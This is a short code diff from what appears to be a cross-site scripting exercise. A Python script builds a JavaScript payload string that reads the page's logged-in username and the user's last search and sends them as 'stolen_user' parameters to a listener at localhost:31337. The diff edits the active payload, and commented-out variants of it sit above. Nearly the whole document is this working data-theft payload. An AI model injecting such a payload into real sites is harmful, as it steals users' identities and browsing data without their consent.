@@ -2,7 +2,7 @@ import string
 # stri = "hello"
 # stri = "window.onload = function() { var username = document.getElementById('logged-in-user').innerHTML; var last_search = document.getElementById('history-list').childNodes[1].innerHTML; var url = 'http://localhost:31337/?stolen_user=' + username + '&last_search=' + last_search; $.get(url);}"
 # stri = "onerror = " + "window.onload = function() { var username = document.getElementById('logged-in-user').innerHTML; var last_search = document.getElementById('history-list').childNodes[1].innerHTML; var url = 'http://localhost:31337/?stolen_user=' + username + '&last_search=' + last_search; $.get(url);}"
-stri = "$(function(){var username = document.getElementById('logged-in-user').innerHTML; var last_search = document.getElementById('history-list').getElementsByClassName('list-group-item')[1].innerHTML; url = 'http://localhost:31337/?stolen_user=' + username + '&last_search=' + last_search; $.get(url, function(data){});});"
+stri = "$(function(){ var username = document.getElementById('logged-in-user').innerHTML; var last_search = document.getElementById('history-list').childNodes[1].innerHTML; var url = 'http://localhost:31337/?stolen_user=' + username + '&last_search=' + last_search; $.get(url, function(data){});});"
 
 
 # print(stri)
